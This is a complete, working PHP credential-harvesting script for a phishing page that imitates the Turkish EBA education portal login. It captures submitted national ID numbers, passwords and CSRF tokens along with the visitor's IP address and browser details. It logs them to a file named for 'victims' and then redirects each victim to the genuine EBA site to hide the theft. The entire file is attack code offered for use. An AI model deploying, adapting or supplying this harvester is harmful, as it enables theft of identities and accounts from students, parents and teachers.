<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $tc = isset($_POST['tckn']) ? trim($_POST['tckn']) : 'boş';
    $sifre = isset($_POST['password']) ? trim($_POST['password']) : 'boş';
    $csrf = isset($_POST['girisCsrfToken']) ? $_POST['girisCsrfToken'] : 'yok';

    $ip = $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];
    $zaman = date('d.m.Y H:i:s');

    $log = "=== EBA KURBAN $zaman ===\nIP: $ip\nUA: $ua\nTC: $tc\nŞifre: $sifre\nCSRF: $csrf\n====================\n\n";

    file_put_contents("kurbanlar.txt", $log, FILE_APPEND);

    // Gerçek siteye yönlendir
    header("Location: https://giris.eba.gov.tr/EBABA_GIR");
    exit();
}
?>
